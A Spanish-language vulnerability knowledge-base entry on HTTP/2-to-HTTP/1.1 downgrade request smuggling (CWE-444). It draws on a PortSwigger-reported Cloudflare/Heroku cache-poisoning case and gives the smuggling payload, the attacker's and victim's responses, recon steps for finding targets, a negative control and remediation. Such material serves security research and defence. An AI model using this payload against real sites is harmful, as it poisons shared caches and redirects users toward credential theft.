---
clase: protocolo
tech: http2-downgrade
cwe: CWE-444
cvss: 9.3 # [derivado] no hay CVE asignado; estimado por alcance (24M+ sitios) e impacto de envenenamiento de caché
payload: |
  # NOTA DE PROCEDENCIA (H1): el render HTML de la fuente colapsa los saltos de
  # linea dentro de los bloques de codigo. La estructura por lineas de abajo esta
  # RECONSTRUIDA a partir de la sintaxis de cabeceras HTTP (deterministica);
  # la posicion exacta de la linea en blanco cuerpo/cabecera no es verificable
  # desde el render. Verificar contra la fuente antes de usar.
  #
  # Peticion del atacante: HTTP/2 al front-end, degradado a HTTP/1.1 upstream.
  # El cuerpo contiene una segunda peticion completa que el back-end lee como
  # peticion independiente.
  GET /assets/icon.png HTTP/2
  Host: $HOST_FRONTEND_CLOUDFLARE

  GET /assets HTTP/1.1
  Host: psres.net
  X: y

  # Respuesta observada (la entrada queda cacheada):
  #   HTTP/2 200 OK
  #   Cf-Cache-Status: HIT
precondicion: "Front-end habla HTTP/2 con el cliente y lo degrada a HTTP/1.1 hacia el origen, sin re-validar Content-Length frente a la longitud real del cuerpo HTTP/2. En el caso documentado: Cloudflare como front-end y Heroku como origen."
como_se_descubre: |
  Señal en recon: el sitio responde `HTTP/2` al cliente pero el origen declara
  tecnologia que solo habla HTTP/1.1 (cabecera `Via`, `Server`, banners de PaaS).
  La combinacion "front-end HTTP/2 + degradacion upstream" es la precondicion
  estructural. Confirmacion: enviar una peticion HTTP/2 cuyo cuerpo sea una
  peticion HTTP/1.1 valida y observar si la respuesta corresponde a la peticion
  interna en lugar de la externa.
control_negativo: |
  # [derivado] diseño de test A/B, no presente literal en la fuente
  # A: peticion HTTP/2 con la segunda peticion embebida en el cuerpo
  #    -> respuesta/caché corresponde a la peticion INTERNA (desync confirmado)
  # B: identica peticion HTTP/2 con cuerpo vacio
  #    -> respuesta corresponde a la ruta solicitada (/assets/icon.png), sin desvio
  # Si A y B dan la misma respuesta, no hay desync: es otra causa (redirect, caché previa).
mata: |
  - El front-end NO degrada a HTTP/1.1 (HTTP/2 extremo a extremo) -> la clase entera muere.
  - El front-end recalcula y normaliza Content-Length al traducir H2->H1.1.
  - La respuesta a A y a B es identica (ver control negativo).
  - No hay caché compartida delante -> el impacto se reduce a self-desync, no a victimas.
fuente: "https://portswigger.net/research/http1-must-die (James Kettle, publicado 2025-08-06, actualizado 2025-10-17). Caso atribuido en el articulo a Wannes Verwimp; Cloudflare parcheo, publico post-mortem y pago $7,000."
confianza: media
fecha: 2026-11-02
---
# [PROTOCOLO] Desync por degradación HTTP/2→HTTP/1.1 en Cloudflare/Heroku — envenenamiento de caché que redirige a 24M+ sitios

## Principio
Cuando un front-end acepta HTTP/2 y lo traduce a HTTP/1.1 hacia el origen, la longitud
del cuerpo pasa de estar delimitada por frames (explícita e inambigua en H2) a estar
delimitada por una cabecera `Content-Length` de texto. Si el front-end confía en la
cabecera en vez de en la longitud real del frame, el cuerpo puede contener una petición
entera que el back-end procesa como si fuera independiente.

## Payload
```http
GET /assets/icon.png HTTP/2
Host: $HOST_FRONTEND_CLOUDFLARE

GET /assets HTTP/1.1
Host: psres.net
X: y
```

Respuesta observada por el atacante, que marca que la entrada ha quedado en caché:

```http
HTTP/2 200 OK
Cf-Cache-Status: HIT
```

Petición de una víctima posterior, y lo que recibe:

```http
GET / HTTP/2
Host: $HOST_FRONTEND_CLOUDFLARE
```

```http
HTTP/2 302 Found
Location: https://psres.net/assets/
```

`psres.net` es el dominio de investigación de PortSwigger, literal en la fuente: es el
host controlado por el atacante al que se desvía a la víctima.

## Impacto
El atacante escribe en la caché compartida del CDN una respuesta que redirige a un
dominio que él controla. Cualquier usuario que pida la ruta envenenada recibe el 302.
El artículo cuantifica el alcance del fallo en más de 24.000.000 de sitios web
expuestos, porque el defecto estaba en la combinación de infraestructura
(Cloudflare→Heroku), no en el código de cada sitio. Con una redirección controlada se
encadena robo de credenciales, carga de JS arbitrario y secuestro de flujos OAuth.

## Remediación
De la fuente: Cloudflare parcheó el fallo y publicó un post-mortem. La recomendación
estructural que da el artículo para la clase completa es eliminar HTTP/1.1 del salto
upstream: *"ensure your origin server supports HTTP/2"* y después *"toggle upstream
HTTP/2 on your proxies"*. Mientras exista el salto H2→H1.1, la ambigüedad de longitud
sigue siendo alcanzable. `# [derivado]` adicional: si no se puede activar H2 upstream,
el front-end debe recalcular `Content-Length` desde la longitud real de los frames y
rechazar cualquier discrepancia en lugar de reenviarla.
